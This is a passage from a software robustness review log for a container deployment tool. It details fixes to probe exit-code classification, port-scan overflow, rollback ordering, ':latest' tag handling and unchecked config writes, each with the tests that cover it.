`signal()` are `None` (a "stopped", non-terminal status — not something
`wait()`/`output()` actually returns) or on non-Unix targets (where
`ExitStatusExt` doesn't exist). `.ok` (`exit_code == 0`) is unaffected either
way, since neither `-1` nor any `128 + signal` value is ever `0`. Also fixed
two now-stale doc comments in `src/engine/builtins/sim.rs` (R32's classifier)
that had described `-1`'s sentinel meaning as including "a signal-killed
process" — a signal-killed probe now falls through to the ordinary
non-zero-exit error path instead, with the real, informative code (e.g.
`137`) in the message rather than the generic "no real exit code" one.
Covered by two new tests in `src/engine/runner.rs`:
`exit_code_of_maps_a_signal_kill_to_128_plus_signal_not_the_spawn_failure_sentinel`
(unit-level, spawns a real child, kills it with SIGKILL, and asserts the
mapped code is `137`, not `-1`) and
`real_runner_run_local_reports_128_plus_signal_for_a_killed_process`
(end-to-end through `RealRunner::run_local`, same assertion). Mutation-
verified: reverting `exit_code_of` to the old `status.code().unwrap_or(-1)`
made the first test fail for the right reason (`137` expected, `-1` got).

**Follow-up (found during this fix's own Opus review) — a genuine fail-unsafe
regression, fixed.** `src/engine/builtins/sim.rs`'s `real_port_open` (backing
`sim_pick_port`/`sim_wait_port`, robustness review R16) used to catch a
signal-killed remote `nc -z` via the SAME `exit_code < 0` guard
`probe_absent_or_err` uses — but this fix's whole point is that a
signal-killed process no longer produces `-1`. Without a replacement guard,
`real_port_open`'s INVERTED default (`Ok(out.exit_code == 0)`, i.e. "anything
non-zero means the port isn't open, i.e. free") would have silently reported
a port whose probe was killed mid-scan (e.g. by the OOM killer) as **free**,
handing it straight to `docker run -p` — the exact "opaque bind-conflict
error far from the actual cause" failure mode R16 exists to prevent. (The
container/image classifier, `probe_absent_or_err`, was NOT affected the same
way: its fallthrough is a generic `Err` — fail-safe — so a signal-killed
container probe already throws correctly there.) Fixed by adding an explicit
`out.exit_code >= 129` guard to `real_port_open`, alongside its existing
`< 0`/`== 127`/`== 255` guards: `129` is the lowest value `exit_code_of`'s
signal encoding can ever produce (`128 + 1`, the lowest real signal number),
so this range is unambiguous and can only mean "signal-killed" for THIS
codebase's own runner. Covered by two new tests,
`live_pick_port_throws_on_a_signal_killed_nc_instead_of_treating_every_port_as_free`
and `live_wait_port_throws_on_a_signal_killed_nc` (`src/engine/builtins/sim.rs`,
using a new `SignalKilledRunner` fixture reporting `exit_code: 137` on every
call), mutation-verified: removing the new `>= 129` guard made both tests
fail for the right reason (silently reported free/never-open instead of
throwing).

**Follow-up (found during this fix's own Fable review), two items.** (1)
*Narrative precision:* the paragraph above should not be read as "the
OOM-kill hole was introduced by this fix" — it wasn't. A **remote** `nc -z`
killed by the remote host's own OOM killer never touches this codebase's
`exit_code_of` at all; `ssh` reports the *remote* shell's `128+signal` exit
status directly, and `real_port_open` receives that number exactly as it
always has, unchanged by this fix. That specific remote-OOM path was
already fail-unsafe (silently "free") **before** commit `8be2de2` too — the
new `>= 129` guard fixes it now only incidentally, because the same numeric
range (`128+signal`) happens to describe both the remote shell's exit
status and this codebase's own local `exit_code_of` encoding. Reverting
`8be2de2` alone would NOT have reintroduced this particular hole (it was
never closed by that commit specifically); what `8be2de2` actually
introduced was the *local* signal-kill case (a probe run via
`RealRunner::run_local`/`run_ssh` itself getting killed, e.g. by the local
OOM killer or a Ctrl-C), which previously surfaced as `-1` (caught by the
old `< 0` guard) and after `8be2de2` surfaces as `128+signal` (needing the
new `>= 129` guard added here). (2) *Boundary-value test gap:* the two
tests above only ever exercised the arbitrary example code `137`, never the
guard's actual boundary — an off-by-one edit (`> 129` or `>= 130` instead
of `>= 129`) would have shipped silently. Fixed by parameterizing the test
fixture to `SignalKilledRunner(i64)` and adding
`live_pick_port_throws_at_exactly_the_lowest_possible_signal_kill_code_129`
(asserts `129` throws) and `live_pick_port_does_not_throw_on_a_plain_exit_128`
(asserts `128` — one below the boundary, a legitimate plain `nc` exit code
never produced by this codebase's own encoding — does NOT throw).
Mutation-verified: changing the guard to `> 129` made the new `129` test
fail for the right reason ("exit code 129 (the lowest signal-kill
encoding) must throw").

### No connection reuse — Low/Medium
Every builtin call opens a fresh SSH connection. A `wait_healthy` loop reconnects
every 2 s × 30, and a fleet command reconnects per host per call. `ControlMaster` /
`ControlPersist` would cut deploy latency substantially.

---

## 4. Dry-run / live divergence and probes (`src/engine/builtins/sim.rs`)

### R4 — High — probe classifier mistakes a missing CLI for an absent container — ✅ resolved
`sim.rs:44` (`probe_absent_or_err`). **Verified.**

```rust
if err.contains("no such") || err.contains("not found") { return Ok(false); }
```
The function's own doc comment says a missing CLI (exit 127) "must surface as an
error, never be mistaken for 'not running'." But `docker: command not found`
contains the substring `not found`, so on a host **without** the container runtime,
a live probe returns "container absent" instead of throwing. The deploy then takes
the fresh-install branch against a host where nothing can run, failing confusingly
mid-flight instead of at a clear precondition.
**Fix:** match the runtime's actual absent-object phrasing (`no such object`,
`no such container`, `no such image`) and exclude `command not found` (exit 127).

**Resolved (2026-07-10).** `probe_absent_or_err` now checks `exit_code == 127`
FIRST and unconditionally throws (naming the exit code and suggesting the
runtime may not be installed), regardless of stderr wording — a shell's exact
"command not found" phrasing isn't a stable contract to text-match against
(bash says `docker: command not found`; dash/POSIX `sh` says `docker: not
found`); even if some shell used a different exit code, the fail-safe
direction is preserved, since the only remaining path to "absent" is a
`"no such"` match. The `"not found"` substring branch was removed entirely:
Docker's and (for containers) Podman's real absent-object responses (`No
such container`, `No such image`) contain `"no such"`, already covered, so
nothing legitimate relied on the removed branch. Covered by a new unit test,
`live_probe_missing_cli_throws_instead_of_reporting_absent`
(`src/engine/builtins/sim.rs`), using a fixture runner that returns exit 127
with `"bash: docker: command not found"` — confirmed to fail (wrongly
reporting the container absent) against the original code before the fix.

An Opus review pass on this fix flagged that Podman's absent-**image**
wording is reportedly `image not known` — not `"no such"` — so `real_image_id`
on Podman may still throw instead of correctly reporting an absent image on
a first deploy. This is a distinct, **pre-existing** gap (the old `"not
found"` branch didn't catch `"image not known"` either, so R4's fix neither
causes nor widens it) and is unverified against a real Podman install here.
Tracked separately as R31 below rather than folded into this fix.

### R31 — Medium — Podman's absent-image wording may not be recognized by the probe classifier — ✅ resolved
`sim.rs:63` (`probe_absent_or_err`, the `"no such"` check used by
`real_image_id`). Originally flagged as unverified by an Opus review pass on
R4; a Fable final-review pass then independently confirmed it against
Podman's actual source.

Podman's `image inspect` on a missing image says `Error: <tag>: image not
known` rather than Docker's `Error: No such image: <tag>` — confirmed
against `containers/storage`'s `ErrImageUnknown = "image not known"` (the
error `LookupImage`, which backs `podman image inspect`, returns on a
missing image) and matching real-world CLI output reports. This does NOT
match the `"no such"` substring the shared classifier relies on, so a first
deploy of a new image tag under `rt::set_runtime("podman")` would throw a
"container probe failed" error instead of correctly treating the image as
not-yet-pulled.
**Fix:** verify Podman's actual `image inspect` failure text on a real
Podman install (and nerdctl's, while at it — also unverified here), and
either broaden the classifier's absent-match set or special-case it per
configured runtime.

**Resolved (2026-07-10).** `real_image_id` now recognizes `"image not
known"` directly, scoped to the image probe only (not folded into the
shared `probe_absent_or_err` classifier, which container probes also use —
that phrasing is specific to `image inspect`). nerdctl's absent-image
wording remains unverified; if it turns out to differ from both Docker's
and Podman's, the same scoped-check pattern applies. Covered by a new unit
test, `live_image_id_recognizes_podmans_absent_image_wording`
(`src/engine/builtins/sim.rs`), using a fixture runner returning exit 125
with `"Error: myapp:v1: image not known"` — confirmed to fail (throwing
instead of reporting absent) against the code before this fix.

### R32 — Low — a local spawn failure's own error text can trip the "no such" absent-match — ✅ resolved
`src/engine/builtins/sim.rs` (`probe_absent_or_err`). Found while reviewing R4b's
new `docker_container_running` call site: `RealRunner::run_ssh`/`run_local` (and
their `*_stdin` siblings) report a LOCAL spawn failure — e.g. the `ssh` binary
itself isn't installed on the machine RUNNING `nrg` — as `exit_code: -1` with a
message like `"ssh spawn failed: No such file or directory (os error 2)"`
(`io::ErrorKind::NotFound`'s Display text). That message itself contains "no
such" — the exact substring `probe_absent_or_err` treats as a legitimate
"container/image absent" answer — so a probe that never even ran was silently
misclassified as "the entity doesn't exist" instead of "the probe failed to
run", exactly the R4/R31 bug class but for a different, LOCAL root cause.

In practice this is narrow: `ssh` being missing on the calling machine breaks
literally every other command `nrg` issues too (all of them shell out through
the same `ssh -o BatchMode=yes ...` invocation), so it isn't a realistic
"otherwise-working nrg install" scenario — but it directly undermined R4b's new
guard specifically (in this sandbox, `docker_container_running` silently
reported "not running" instead of erroring, since `ssh` isn't installed here),
which is what surfaced it.

**Resolved (2026-07-10).** `probe_absent_or_err` now checks `exit_code < 0`
first — `-1` is this codebase's own sentinel for "not a real process exit"
(a local spawn/wait failure or an option-injection rejection; see the fields'
usage across `RealRunner`) — and unconditionally errors, mirroring exit 127's
existing handling for the analogous remote-side case. (A signal-killed
process no longer shares this `-1` sentinel — see the later, separate
"Signal-killed process indistinguishable from spawn failure" fix below, which
gives it its own positive `128 + signal` code instead.) Covered by a new unit test,
`live_probe_local_spawn_failure_throws_instead_of_reporting_absent`
(`src/engine/builtins/sim.rs`), using a fixture runner reproducing the exact
`exit_code: -1` / `"...No such file or directory..."` shape — confirmed to fail
(reporting absent instead of throwing) against the code before this fix.

### R16 — Medium — live port scan assumes `nc`, treats any nonzero as "free" — 🟡 partially resolved
`sim.rs:111` (`real_port_open`), surfaced via `deploy.rhai:323`. `nc -z ...` exit
!= 0 is read as "port free". On a host without `nc`, **every** candidate looks free
(exit 127), so `pick_port` returns `base+10000` even when a container already binds
it — the deploy dies later with an opaque `docker run -p` bind error inside the
transaction. Also: only localhost-bound listeners are seen, and base ports ≥ 55536
saturate `u16` so all 100 candidates collapse to the same port. Plus a TOCTOU gap
between the scan and `docker run`.

**Resolved in part (2026-07-10).** `real_port_open` now mirrors `probe_absent_or_err`'s
existing exit-127 / negative-exit-code guards (the exact same fail-safe pattern R4/R32
already established for container-runtime probes): `exit_code < 0` (a local spawn
failure — `nc`'s own process never ran) and `exit_code == 127` (`nc` not found on the
host) both now throw immediately, naming the real cause, instead of being silently
folded into "port free" alongside `nc`'s ordinary connection-refused/timeout exit.
Both `sim_pick_port` (the scan-for-a-free-port direction) and `sim_wait_port` (the
opposite polarity — waiting for a port to become occupied, used by the health-check
retry loop) share the fixed helper. Covered by 3 new unit tests in
`src/engine/builtins/sim.rs` (`live_pick_port_throws_when_nc_is_missing_instead_of_treating_every_port_as_free`,
`live_pick_port_throws_on_a_local_spawn_failure_instead_of_treating_every_port_as_free`,
`live_wait_port_throws_when_nc_is_missing`), all mutation-verified — reverting the fix
made the `nc`-missing case for `sim_wait_port` specifically also take the FULL 60s
retry budget before returning the wrong answer, which the fix avoids by throwing on
the very first probe.

Fable's final review (independently re-deriving the exit-code logic, re-running both
mutation checks — including personally timing the 60s `sim_wait_port` case — and
auditing every `sim_pick_port`/`sim_wait_port` call site in `lib/*.rhai` for correct
error propagation) returned SHIP WITH FOLLOW-UPS, all non-blocking, and flagged one
genuine gap the original fix missed: exit 255 (`ssh`'s own reserved code for "ssh
itself failed" — couldn't connect, auth failure, dropped mid-command — never a real
`nc` exit) still fell through to `Ok(exit_code == 0)`/"free", the same bug shape the
rest of this fix closes. Fixed in the same slice: `real_port_open` now also throws on
exit 255, covered by two more tests
(`live_pick_port_throws_on_an_ssh_transport_failure_instead_of_treating_every_port_as_free`,
`live_wait_port_throws_on_an_ssh_transport_failure`), mutation-verified with a
surgical mutation (removing only the 255 guard) confirming exactly these two new
tests fail while every other guard's test still passes.

**Still open:** two of the original finding's three remaining sub-issues are unchanged
by this fix and remain real gaps: (1) `nc -z localhost <port>` only sees
localhost-bound listeners, so a process bound to a specific interface or `0.0.0.0`
via a path this probe can't see would still look free; (3) the scan-then-`docker run -p`
sequence is still a TOCTOU gap — nothing reserves the chosen port between the probe
and the bind, so a concurrent process (or a second simultaneous `nrg` deploy — see
R15) can still race it. Neither is addressed here; they need a genuinely different
approach (binding a reservation socket, or accepting the TOCTOU as inherent to a
`docker run -p` model without a reservation API) rather than an arithmetic fix.

**Sub-issue (2) resolved (2026-07-11, round 3).** "a `base` port ≥ 55536 saturates the
`u16` scan-start arithmetic, collapsing all 100 candidates to the same value."
`sim_pick_port` (`src/engine/builtins/sim.rs`) computed its scan-window start as
`as_port(base).saturating_add(10000)`, entirely in `u16` — for any `base` high enough
that `base + 10000` alone (or, more subtly, `base + 10000 + offset` for a LATER
offset in the 0..100 scan loop) would exceed `u16::MAX` (65535), `.saturating_add`
silently clamps to 65535 instead of overflowing, so instead of scanning 100 distinct
candidate ports the function ends up probing port 65535 itself repeatedly — up to 100
times over, in the worst case. Fixed by computing the scan window's start AND its
final candidate in `u32` first (`as_port(base) as u32 + 10000`, then `+ 99` for the
last of the 100 candidates) and explicitly checking whether that final candidate
exceeds `u16::MAX` before ever entering the scan loop; if it does, `sim_pick_port` now
throws a clear "cannot scan for a free port ... exceeds the maximum port number 65535"
error instead of silently degrading into the collapsed-candidate bug. This is
deliberately a STRICTER check than the original finding's own "`base >= 55536`"
framing: checking the whole 100-candidate window (not just the start) catches
partially-corrupted windows too — a `base` as low as 55437 already has its LATER
scan candidates (roughly the last few of the 100) collapse under the old
arithmetic, even though its start port alone still fit in `u16`. Covered by two new
tests in `src/engine/builtins/sim.rs`:
`live_pick_port_throws_a_clear_error_instead_of_silently_scanning_one_port_when_base_would_overflow_u16`
(`base = 55437`, exactly one past the real boundary — `55437 + 10000 + 99 == 65536`
— asserts the fix throws with the new, specific error message rather than falling
through to the generic "no free host port" exhausted-scan message) and
`live_pick_port_succeeds_at_the_highest_base_that_still_fits_entirely_in_u16`
(`base = 55436`, exactly at the boundary — `55436 + 10000 + 99 == 65535`, `u16::MAX`
itself — asserts the fix does NOT throw and returns the expected first candidate,
pinning the guard's edge from the other side). Mutation-verified: reverting to the
old `.saturating_add`-in-`u16` arithmetic made the `base = 55437` test fail for the
right reason (silently returned a value instead of throwing), while the `base =
55436` boundary test — correctly — still passed either way, since that base was
never actually broken by the old code; it exists to prove the new guard doesn't
falsely reject a base port that's genuinely still safe.

**Follow-up (found during this fix's own Opus review) — no correctness issues, one
cosmetic display bug fixed.** Opus independently re-derived every boundary by hand
(confirming `base = 55436`/`55437` are the exact true edges, not off-by-one),
confirmed the loop's plain (non-saturating) `u16` addition can never overflow given
the pre-check, confirmed the "stricter than the original `base >= 55536` framing"
claim by tracing actual corrupted-candidate counts across the 55437–55535 sub-range
(e.g. `base = 55500` has 64 of its 100 candidates corrupted under the old code, even
though its *start* port alone still fit in `u16`), and confirmed both new tests
genuinely exercise Live mode. The one real (cosmetic, display-only) bug found: the
"exhausted scan" error message's upper bound was still computed as
`start.saturating_add(100)` in `u16` — at the highest base that passes the new guard
(`base = 55436`, `start = 65436`), `65436 + 100 = 65536` overflows `u16` and the old
`.saturating_add` silently clamped it to `65535`, displaying an off-by-one-low range
("`65436..65535`") with no effect on which ports were actually scanned. Fixed by
computing that display value in `u32` (`start_u32 + 100`) instead, which can't
overflow. Covered by a new test,
`live_pick_port_exhausted_scan_message_reports_the_correct_upper_bound_at_the_highest_base`,
mutation-verified: reverting to `start.saturating_add(100)` made it fail for the
right reason (displayed the wrong, clamped `65436..65535` instead of the correct
`65436..65536`).

**Follow-up (found during this fix's own Fable final review) — a genuine unclosed
sibling bug, fixed; two cosmetic nits also fixed.** Fable independently re-derived
the live-path boundary arithmetic (confirmed correct) and traced the DryRun error
message's `u32` computation across the whole valid range (confirmed correct, not
just at the tested edge) — but found the fix, and Opus's review of it, both missed
that `sim_pick_port`'s **DryRun** sibling has the exact same bug class:
`SimState::pick_port` (`src/engine/sim.rs`) still computed
`base.saturating_add(10000).saturating_add(*n)` entirely in `u16`, silently
clamping instead of overflowing for a high enough `base` — so a `--dry-run` of the
very deploy this fix's LIVE guard now rejects would still produce a clean plan
naming a collided port, exactly the dry-run/live divergence this module's own
design (`src/engine/builtins/sim.rs`'s module doc comment) otherwise goes out of
its way to prevent. Fixed the same way: `pick_port` now computes in `u32` first
and returns `None` (rather than a collapsed port) when `base + 10000 + Nth-pick`
would exceed `u16::MAX`; its caller (`sim_pick_port`'s DryRun branch) maps that to
the same shape of clear error the Live branch throws. Covered by two new tests in
`src/engine/sim.rs` (`pick_port_returns_none_instead_of_a_collapsed_port_when_base_would_overflow_u16`,
`pick_port_still_succeeds_at_the_highest_base_that_fits_in_u16` — note DryRun's
boundary, 55535/55536, differs from Live's 55436/55437, since DryRun checks only
the ONE port this specific call would produce, not a 100-candidate window),
mutation-verified against the old saturating arithmetic. Two smaller nits from the
same review, also fixed: (1) the Live guard's error message interpolated the raw,
unclamped `base` argument next to an already-clamped candidate number, producing a
self-contradictory message for a script-supplied `base` far outside `0..=65535`
(e.g. `i64::MAX`) — both the message and the underlying arithmetic now consistently
use `as_port(base)` throughout; the same raw-`base` addition in the DryRun
"pick free port from ..." record message was also fixed the same way, closing a
latent integer-overflow-panic risk on an extreme script-supplied `base`. (2) The
`SignalKilledRunner` test fixture's doc comment was stale — its first sentence
described only its original signal-kill purpose, contradicting the parameterized
sentence right after it (which explains it's also reused for ordinary exit codes
like `0`/`1` in this and other slices); reworded for consistency, no code change.

### Fixed 60 s live probe budgets — Medium — ✅ resolved (folded into R11)
`sim_container_healthy` and `sim_wait_port` used to loop `30 × 2 s` hard-coded
internally, on top of the stdlib's own `cfg.attempts`/`cfg.interval` retry loop in
`healthcheck.rhai`. R11's fix (above) removed this inner hard-coded loop entirely —
each builtin now does exactly one probe per call — so a slow-booting app is no
longer bounded by an extra hidden 60s-per-attempt floor; `cfg.attempts`/
`cfg.interval` alone now control both the extendable knob and the total budget.

---

## 5. Deploy orchestration & rollback (`lib/deploy.rhai`, `lib/caddy.rhai`)

### R6 — High — rollback blackhole: a failed compensation still deletes the live container — ✅ resolved
`lib/deploy.rhai` (~360–385) with `src/engine/transaction.rs:70`. **Verified**
(unwind logs and continues on a failed compensation).

During unwind, if the restore-proxy compensation fails (SSH blip, the proxy's health
gate rejecting a degraded old container, or a bogus `old_target` per R10/R4-fallback),
the unwind **continues** to the next compensation and `docker rm -f`'s the new
container — which the proxy is still pointing at. Traffic on that host is blackholed
by the rollback itself.
**Fix:** make the "remove new container" compensation conditional on the proxy
having been successfully restored (guard on the restore result), or order the
compensations so traffic is never pointed at a container that is about to be removed.

**Resolved (2026-07-10).** `deploy_one_host` (`lib/deploy.rhai`) now guards the
rm-new compensation on TWO shared flags: `proxy_switched` (set once the
FORWARD switch to the new container actually happens) and `proxy_restored`
(set only once the restore-proxy compensation's `px_deploy` call returns
*without* throwing). The rm-new compensation skips the removal — with an
operator-facing message explaining why — only when `proxy_switched &&
!proxy_restored`: the proxy was pointed at the new container AND the restore
back genuinely failed. Rhai closures that reference the same outer-scope
variable share the same underlying cell (empirically confirmed against the
real engine, not just assumed from documentation), so a write in one
compensation is visible from the other despite being invoked at different
points during the unwind.

A first version of this fix used a single `proxy_restored` flag and was
caught by an Opus review pass as a regression: rm-new is registered
IMMEDIATELY after the container starts, *before* the health check and the
forward switch — so on a health-check failure (the most common failure mode)
only rm-new is ever registered, `proxy_restored` stays false, and the
single-flag guard would wrongly leave the never-healthy new container running
on every failed deploy (there's no blackhole risk there — the proxy was never
switched away from the still-running old container — so removal is exactly
the pre-R6-fix, correct behavior). The second `proxy_switched` flag narrows
the guard to the genuinely unsafe case.

Covered by three Rust-level unit tests mirroring this exact shape against the
real `transaction()`/`on_rollback()` machinery
(`src/engine/transaction.rs::guarded_compensation_skips_its_destructive_step_when_the_prior_one_fails`,
its happy-path counterpart, and
`guarded_compensation_still_runs_when_the_proxy_was_never_switched` for the
health-check-failure shape) — each "must skip" / "must still run" assertion
was confirmed to fail against the corresponding buggy variant (the fully
unguarded pattern, and separately the single-flag guard) before its guard was
added. As with the rest of the deploy path (R8), this doesn't exercise the
literal `lib/deploy.rhai` file end-to-end in live mode (that would need a
real Docker daemon and a real HTTP health check) — the tests instead mirror
`deploy_one_host`'s exact registration order and guard logic through the real
engine.

### R10 — Medium — `:latest` default tag breaks the rollback chain — ✅ resolved
`lib/recipe.rhai:34` (`env_or("DEPLOY_TAG", "latest")`) with
`deploy.rhai:170`. **Verified.**

The rollback pointer `<service>.prev` is only written when `prev_image != image`
(a **string** compare). Two `:latest` deploys compare equal, so `.prev` is never
recorded and `rollback()` throws "No rollback image found." Even when it doesn't,
`:latest` on the host has already been overwritten by the broken build, so a
"rollback" re-pulls the same broken image. Default to an immutable tag (git SHA), or
refuse to deploy a mutable `:latest` without an explicit opt-in.

**Resolved (2026-07-10).** Went with a warn-loudly-but-don't-break-the-quickstart
approach rather than a hard refusal: `:latest` (`env_or("DEPLOY_TAG", "latest")`) is
the documented default for a first deploy (`docs/getting-started.md`), so outright
blocking it would break that flow. Instead:

- `deploy()` now prints a clear `[warn]` when the resolved tag is `:latest` (or has
  no tag at all — Docker treats these identically), explaining that rollback may not
  be able to safely undo this build.
- `rollback()` now **throws**, before touching any host, when the image it's about
  to redeploy comes from the automatic `<service>.prev` snapshot AND that snapshot
  is itself a mutable `:latest` tag — this is the actually-dangerous silent case the
  finding describes (a "rollback" that quietly redeploys the same broken bits). An
  **explicit** `cfg.image` override passed by the caller is a deliberate, informed
  choice and is deliberately NOT second-guessed by this check.
- The pre-existing "No rollback image found" error (when `.prev` was never
  recorded at all, because every deploy so far shared the identical `:latest`
  string) now hints at the `:latest` root cause when it applies, instead of leaving
  the operator to guess why no snapshot exists.

Both `extract_version(image)` checks reuse the file's own existing tag-parsing
helper (already correctly treating a missing tag as `"latest"`), so no new
tag-parsing logic was introduced — the comparison itself is case-insensitive
(`.to_lower() == "latest"`), added after an adversarial Fable review pass found
that Docker's tag charset (`[\w][\w.-]{0,127}` per the distribution spec) allows
uppercase, so a tag literally spelled `LATEST` or `Latest` is syntactically valid
and distinct from `latest` — and silently bypassed BOTH the warning and the
refusal before this was fixed. Deliberately NOT handled (see "Still open" below):
leading/trailing whitespace, an empty tag, and non-ASCII homoglyphs — none of
these are valid characters in Docker's own tag charset, so they can never occur
in a tag that actually round-tripped through a real registry; handling them would
be defending against inputs Docker itself already rejects.

Covered by 8 new integration tests in `tests/deploy_behaviors.rs`
(`deploy_warns_when_deploying_a_mutable_latest_tag`,
`deploy_warns_when_tag_is_omitted_entirely_since_it_implies_latest`,
`deploy_with_a_pinned_tag_does_not_warn`, `deploy_warns_on_a_case_variant_of_latest`,
`rollback_refuses_to_use_a_mutable_latest_snapshot`,
`rollback_refuses_a_case_variant_of_the_mutable_latest_tag`,
`rollback_with_an_explicit_image_override_ignores_the_mutable_tag_guard`,
`rollback_with_no_prev_state_hints_at_the_mutable_tag_gotcha_when_relevant`), each
confirmed to fail against the pre-fix code.

**Still open:** the detection is NAME-based — it only recognizes the literal
`:latest` tag (or no tag at all, which Docker treats identically). An operator
using a different, self-chosen mutable tag (e.g. `repo:stable`, `repo:prod`)
gets neither `deploy()`'s warning nor `rollback()`'s refusal, and the same
string-compare snapshot in `deploy()` breaks the rollback chain for that tag in
exactly the same way `:latest` used to. This is likely unfixable from local
script logic alone — nothing here can know that `stable` is mutable the way
`latest`/no-tag is mutable by Docker's own convention. Separately, even for
`:latest` itself, this doesn't (and can't, from local script logic alone)
protect against the tag being re-pushed to a DIFFERENT value by some entirely
separate process after `.prev` was recorded but before a rollback runs — that's
inherent to using any mutable tag at all, not something a local check can
detect. Pinning to immutable digests (`repo@sha256:...`) throughout would close
both residual gaps but is a larger, separate change (`extract_version` and the
whole image-tag plumbing currently assume a `repo:tag` shape).

### R4b — Medium — `old_target` fallback uses the container port, not a host port — ✅ resolved
`deploy.rhai:311`. **Verified.** When no `.target`/`.port` state exists (fresh CI
runner, unshared state), `old_target` falls back to `"localhost:" + container_port`
— the in-container port, not the real host port. A mid-deploy failure then restores
the proxy to `localhost:3000` where nothing listens, then removes the new container:
an outage caused by the rollback.

**Resolved (2026-07-10).** `deploy_one_host`'s `old_target` computation
(`lib/deploy.rhai`) gained a third branch, checked before falling back to the
container-port guess: if a canonical old container (`<service>-web`) is
actually running on the host (via the existing `docker_container_running`
sim-routed probe — no new engine primitive needed), that means state was
lost or never shared with this host, NOT that this is a genuine first
deploy — guessing the wrong port here is exactly the R4b danger. The
function now **throws**, before picking a port or starting the new
container, naming the service/host and telling the operator to
`state_set` the real port before retrying. Only when NEITHER state NOR a
running old container exists (a genuine first deploy, or a newly added
fleet host) does the original `"localhost:" + container_port` fallback
still apply — there's nothing to roll back to in that case regardless, so
a guessed target can't make anything worse.

Covered by two new in-crate Rust unit tests
(`src/engine/eval.rs::deploy_throws_when_old_container_is_running_but_no_port_state_is_recorded`
and `::deploy_falls_back_to_the_container_port_when_no_old_container_is_running_either`)
that load the REAL `lib/deploy.rhai` via a `FakeRunner`, each confirmed to
fail (or pass for the wrong reason) against the pre-fix code. Both tests
run in LIVE mode (not `--dry-run`) since `docker_container_running`'s
dry-run seeding assumes an unreachable host is absent, which would mask
exactly the branch under test; LIVE mode also required deliberately NOT
letting either test's deploy reach the health-check phase (`wait_healthy`
does a REAL HTTP request in live mode, `src/engine/builtins/http.rs`), to
avoid a slow/hanging test — the "falls back" test intentionally lets the
deploy fail one phase later (port-picking exhausts its 100 candidates,
since the same all-zero-exit `FakeRunner` default also makes `nc -z`
report every port busy) and asserts on that distinct error instead of a
full successful deploy.

An Opus review pass on this fix surfaced a separate, pre-existing gap in
the probe classifier this new `docker_container_running` call relies on
— see **R32** above (found here, not caused by this fix, and fixed in the
same slice).

### R3b — High — `caddy proxy_boot` ignores a failed config write — ✅ resolved
`lib/caddy.rhai:65` (pre-fix: `:60`). `write_remote(host, base, "/etc/caddy/caddy.json")` needs a
root-writable `/etc` and its result is unchecked; `docker run -d` returns 0
regardless. A non-root deploy user can't write `/etc/caddy`, docker's `-v` then
creates a directory at the path, Caddy crash-loops, but `proxy_boot` reports
success. The failure only surfaces later as opaque curl errors during the traffic
switch — inside the fleet transaction. Check the `write_remote` result.

**Resolved (2026-07-10).** `proxy_boot` now checks `write_remote`'s
`ExecResult` and throws (naming the host and path, with `stderr`) before ever
attempting to start the Caddy container, matching the same
check-and-throw contract used by every other fallible call in the stdlib.
Covered by an in-crate Rust unit test
(`src/engine/eval.rs::caddy_proxy_boot_throws_when_the_config_write_fails`)
that loads the REAL `lib/caddy.rhai` (not a reimplementation) via a
`FakeRunner` configured to fail specifically the config-write command, and
asserts both the thrown message and that `docker run` for Caddy is never
attempted afterward — confirmed to fail (proceeding to start Caddy anyway)
against the original unchecked code before the fix.

### R30 — Medium — `docker_run`/`docker_run_once` also ignore a failed env-file write — ✅ resolved
`lib/docker.rhai:161,205`. **Found by Fable's final review of R3b** (same bug
class, different file — not yet fixed).

Both functions write the container's env vars to a remote file via
`write_remote(host, ..., env_path)` (off-argv, for secrets) and discard the
result, exactly like the pre-fix `caddy proxy_boot`. This is a narrower
window than R3b, because the very next step (`docker run --env-file
<env_path>`) fails loudly if `env_path` doesn't exist at all — so a *fresh*
write failure (nothing ever there) surfaces immediately, not silently.
The real risk is a **stale** file: `docker_run`'s `env_path` is
`/tmp/.nrg-env-<name>`, and `accessory_run` (`deploy.rhai`) calls `docker_run`
with a fixed, non-unique accessory name (e.g. `"redis"`), so re-running it
reuses the SAME path every time. If a re-run's `write_remote` fails
(permissions changed, disk full, `/tmp` on a `noexec`/`nosuid` mount, etc.)
but a file from a **previous, successful** run already sits at that path,
`docker run --env-file` happily reads the OLD env vars instead — the
container starts, looks healthy, and silently runs with stale
secrets/config, with no error anywhere. `docker_run_once`'s path
(`/tmp/.nrg-release-env-<tag>`) has the same shape for repeated releases of
the same image tag.
**Fix:** check the `write_remote` result in both functions and throw on
failure, identical to the R3b fix; consider also making the temp path
per-invocation-unique (e.g. include a timestamp or PID) so a failed write can
never silently fall back to a stale file regardless.

**Resolved (2026-07-10).** Took the first option: both `docker_run` and
`docker_run_once` now check `write_remote`'s result and throw (naming the
host, path, and `stderr`) before ever issuing the `docker run` command,
matching R3b's fix exactly. Left the temp paths as-is (not made
per-invocation-unique) — the throw-on-failure already removes the silent
stale-reuse risk entirely; a unique-path change would be a separate,
independent hardening step with its own tradeoffs (e.g. accumulating
unused env-files under `/tmp` across restarts) and isn't needed to close
this finding. Covered by two in-crate Rust unit tests
(`src/engine/eval.rs::docker_run_throws_when_the_env_file_write_fails` and
`::docker_run_once_throws_when_the_env_file_write_fails`) that load the REAL
`lib/docker.rhai` via a `FakeRunner` configured to fail the env-file write
specifically, each asserting both the thrown message and that the
container/release-task command is never actually issued — both confirmed to
fail (proceeding to run the container anyway) against the original unchecked
code before the fix.

### R6b — Medium — post-commit cleanup failures silently swallowed — ✅ resolved
`deploy.rhai:209`. Rename/stop/remove after commit use `|| true` and unchecked
results, then state is persisted as if cleanup succeeded. If a host drops SSH between
commit and cleanup, the **old** container keeps running under
`--restart unless-stopped` (double capacity, stale code), the new container keeps its
unique name, and the next deploy's rename dance drifts further — with no error ever
surfaced.

**Resolved (2026-07-10).** The `|| true` baked into each remote shell command is
by design — it makes a retry of an already-completed step idempotent (e.g.
renaming a container that's already been renamed away must not fail) — and
that's exactly why it can't be relied on to signal success: it also swallows a
genuine docker-level failure. What it CANNOT mask is an SSH-level failure: if
the command never reaches the host at all (dropped connection, auth failure),
the remote shell — and its `|| true` — never runs, and the returned
`ExecResult`'s `ok` is correctly `false`. The post-commit loop
(`lib/deploy.rhai`) now captures each of the 5 per-host cleanup calls'
results (`docker_rename` ×2, `docker_stop`, `docker_remove`, `docker_cleanup`)
and, if any reports `!ok`, prints a loud `[warn]` naming the host and the risk
(old and new containers may both still be running under their pre-swap names)
and **skips persisting** `<service>.port.<host>`/`.target.<host>` for that
host — leaving whatever was recorded there before untouched, rather than
claiming a swap that may not have happened. The loop still continues to the
next host, and the fleet-wide service-level state (`.version`, `.image`,
